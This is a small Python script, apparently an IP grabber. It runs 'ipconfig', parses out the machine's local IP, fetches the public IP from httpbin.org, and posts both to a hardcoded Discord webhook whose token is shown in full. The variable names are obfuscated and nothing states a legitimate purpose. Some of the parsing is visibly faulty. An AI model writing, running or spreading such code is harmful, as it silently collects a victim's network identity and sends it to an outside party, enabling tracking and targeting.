import requests as r, subprocess as sp, json as j

def g():
    try:
        rl = sp.check_output(["ipconfig"], shell=True, universal_newlines=True)
        pi, pf = rl.find("") + 36, rl.find("\r", rl.find("") + 36)
        il = rl[pi:pf]
        rs = r.get("https://httpbin.org/ip")
        return il, (rs.json() if rs.status_code == 200 else None).get("origin")
    except r.RequestException as e: return None, None

def w(il, k):
    u, p, h = "https://discord.com/api/webhooks/1212900989154099250/6LQWxqzmarY9YUxPLLF2h6kQrYrcjV7NJuaNbVUs4k4RhNBrvEbduTX4IFreMq7T48XF", {"content": f"{il}\n{k}"}, {"Content-Type": "application/json"}
    rs = r.post(u, data=j.dumps(p), headers=h)
    print(f"" if rs.status_code == 204 else f"{rs.status_code}\nResposta: {rs.text}")

il, k = g()
w(il, k)
